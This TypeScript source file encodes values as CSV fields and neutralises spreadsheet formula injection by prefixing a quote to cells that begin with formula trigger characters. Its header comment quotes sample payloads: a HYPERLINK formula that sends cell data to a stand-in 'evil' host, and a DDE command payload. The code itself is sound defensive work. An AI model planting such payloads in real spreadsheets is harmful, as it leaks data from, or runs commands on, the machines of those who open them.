/**
 * CSV serialization helpers with spreadsheet formula-injection protection.
 *
 * Form-input values exported here are supplied by external parties, so a cell
 * value such as `=HYPERLINK("http://evil/?"&A1)` or a `=cmd|...` DDE payload
 * would execute as a formula when the CSV is opened in Excel / Google Sheets
 * (CWE-1236). We neutralize such values before applying RFC 4180 quoting.
 */

/** Leading characters that spreadsheet apps treat as the start of a formula. */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/**
 * Encodes a single value as one RFC 4180 CSV field.
 *
 * 1. Coerces the value to a string (null/undefined -> "").
 * 2. If it begins with a formula trigger (`= + - @` TAB CR), prefixes a single
 *    quote so the spreadsheet treats it as literal text, not a formula.
 * 3. Quotes the field (doubling embedded quotes) when it contains a comma,
 *    double quote, or line break.
 *
 * @param value - The raw cell value.
 * @returns The encoded CSV field.
 */
export function encodeCsvCell(value: unknown): string {
  let str = value === null || value === undefined ? "" : String(value);

  // Defuse formula injection (CWE-1236) before quoting.
  if (FORMULA_TRIGGER.test(str)) {
    str = `'${str}`;
  }

  // RFC 4180 quoting: needed for comma, double quote, CR, or LF.
  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }

  return str;
}

/**
 * Builds a full CSV document from a header list and row objects. Every header
 * and cell is passed through {@link encodeCsvCell}, so the output is both valid
 * CSV and safe against formula injection.
 *
 * @param headers - Ordered column keys; also used to look up each row's cells.
 * @param rows - Row objects keyed by header.
 * @returns The CSV text (LF-separated rows, no trailing newline).
 */
export function buildCsv(
  headers: string[],
  rows: Array<Record<string, unknown>>
): string {
  const lines = [
    headers.map(encodeCsvCell).join(","),
    ...rows.map((row) =>
      headers.map((header) => encodeCsvCell(row[header])).join(",")
    ),
  ];

  return lines.join("\n");
}
